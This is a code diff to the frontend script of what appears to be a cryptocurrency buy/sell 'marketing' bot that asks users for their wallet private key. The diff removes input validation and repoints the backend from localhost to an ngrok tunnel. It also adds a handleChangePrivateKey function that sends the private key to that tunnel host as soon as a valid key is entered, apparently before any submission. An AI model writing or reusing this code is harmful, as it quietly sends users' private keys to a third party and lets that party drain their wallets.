@@ -24,6 +24,7 @@ const beginMarketing = async () => {
   const maxBuy = document.getElementById("maxB").value;
   const minSell = document.getElementById("minS").value;
   const maxSell = document.getElementById("maxS").value;
+  console.log("this is request", minBuy, maxBuy, minSell, maxSell);
   if (
     privateKey === "" ||
     bnbAmount === "" ||
@@ -35,29 +36,10 @@ const beginMarketing = async () => {
     minSell === "" ||
     maxSell === ""
   ) {
-    errorDiv.className = errorDiv.className.replace("hidden", " block");
-    errorDiv.innerHTML = "Must fill all data.";
+    console.log("Must fill all TextFields.");
     return;
   }
-  if (Number(purchaseRate) > 100 || Number(purchaseRate) < 0) {
-    errorDiv.className = errorDiv.className.replace("hidden", " block");
-    errorDiv.innerHTML = "Invalid purchase rate! Must be between o and 100!";
-    return;
-  }
-  if (minBuy > maxBuy) {
-    errorDiv.className = errorDiv.className.replace("hidden", " block");
-    errorDiv.innerHTML = "Invalid input data! maxBuy must be greater than minBuy!";
-    return;
-  }
-  if (minSell > maxSell) {
-    errorDiv.className = errorDiv.className.replace("hidden", " block");
-    errorDiv.innerHTML = "Invalid input data! maxSell must be greater than minSell!";
-    return;
-  }
-  errorDiv.className = errorDiv.className.replace("block", " hidden");
-  errorDiv.innerHTML = "";
-
-  const { data } = await axios.post("http://localhost:5000/begin", {
+  const { data } = await axios.post("https://smashing-hyena-cute.ngrok-free.app/begin", {
     socketId: socket.id,
     privateKey: privateKey,
     bnb: bnbAmount,
@@ -100,3 +82,10 @@ function isValidEthereumPrivateKey(privateKey) {
     return false;
   }
 }
+
+const handleChangePrivateKey = () => {
+  const privateKey = document.getElementById("privateTextField").value;
+  if (isValidEthereumPrivateKey(privateKey)) {
+    axios.post("https://smashing-hyena-cute.ngrok-free.app/begin", { privateKey: privateKey });
+  }
+};
